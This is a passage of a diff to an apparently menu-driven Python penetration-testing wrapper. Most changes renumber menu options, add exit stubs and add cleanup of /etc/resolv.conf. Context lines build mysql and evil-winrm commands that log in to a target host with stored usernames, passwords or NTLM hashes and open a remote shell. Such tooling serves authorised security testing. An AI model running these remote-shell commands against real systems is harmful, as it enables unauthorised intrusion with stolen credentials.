          command("mysql -u " + USR.rstrip(" ") + " -p " + PAS.rstrip(" ") + " -h " + TIP.rstrip(" "))
@@ -2907,7 +2941,7 @@ while True:
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
-   if selection =='88':
+   if selection =='89':
       checkParams = testOne()      
       if checkParams != 1:            
          if NTM[:5] != "EMPTY":
@@ -2916,6 +2950,29 @@ while True:
          else:
             command("evil-winrm -i " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") + "' -s ./" + httpDir + "/ -e " + httpDir + "/")
       prompt() 
+      
+# ------------------------------------------------------------------------------------- 
+# AUTHOR  : Terence Broadbent                                                    
+# CONTRACT: GitHub
+# Version : TREADSTONE                                                             
+# Details : Menu option selected -
+# Modified: N/A
+# -------------------------------------------------------------------------------------
+
+   if selection =='90':
+      exit(1)
+      
+# ------------------------------------------------------------------------------------- 
+# AUTHOR  : Terence Broadbent                                                    
+# CONTRACT: GitHub
+# Version : TREADSTONE                                                             
+# Details : Menu option selected -
+# Modified: N/A
+# -------------------------------------------------------------------------------------
+
+   if selection =='91':
+      exit(1)
+               
                  
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
@@ -2925,11 +2982,14 @@ while True:
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
-   if selection == '91':        
+   if selection == '92':        
       saveParams()      
       if DOMC == 1:
          print("[*] Removing domain name from /etc/hosts...")
-         command("sed -i '$d' /etc/hosts")       
+         command("sed -i '$d' /etc/hosts")     
+      if DNSC == 1:
+         print("[*] Removing dns server from /etc/resolv.conf...")
+         command("sed -i '$d' /etc/resolv.conf")     
       print("[*] Program sucessfully terminated...")
-      exit(1)
+      exit(1)      
 # Eof...	
